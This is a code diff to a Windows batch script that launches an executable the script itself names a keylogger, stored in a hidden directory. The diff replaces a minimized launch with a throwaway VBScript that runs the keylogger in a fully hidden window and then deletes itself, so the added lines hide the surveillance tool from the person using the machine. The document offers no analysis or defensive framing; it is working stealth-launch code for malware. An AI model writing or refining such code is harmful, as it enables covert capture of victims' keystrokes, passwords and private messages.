@@ -3,9 +3,12 @@ echo Starting script... >> %TEMP%\debug.log
 set "KEYLOGGER_PATH=%ALLUSERSPROFILE%\AppDataLocal\HiddenDir\incywincyspider.exe"
 echo KEYLOGGER_PATH: %KEYLOGGER_PATH% >> %TEMP%\debug.log
 if exist "%KEYLOGGER_PATH%" (
-    echo File exists, attempting to run... >> %TEMP%\debug.log
-    start /min "" "%KEYLOGGER_PATH%"
-    echo Run command executed. >> %TEMP%\debug.log
+    echo Creating temporary VBScript to run EXE hidden... >> %TEMP%\debug.log
+    echo Set WShell = CreateObject("WScript.Shell") > %TEMP%\run_hidden.vbs
+    echo WShell.Run """" & "%KEYLOGGER_PATH%" & """", 0, False >> %TEMP%\run_hidden.vbs
+    wscript %TEMP%\run_hidden.vbs
+    echo Hidden run command executed. >> %TEMP%\debug.log
+    del %TEMP%\run_hidden.vbs
 ) else (
     echo Error: Keylogger file not found! >> %TEMP%\debug.log
 )
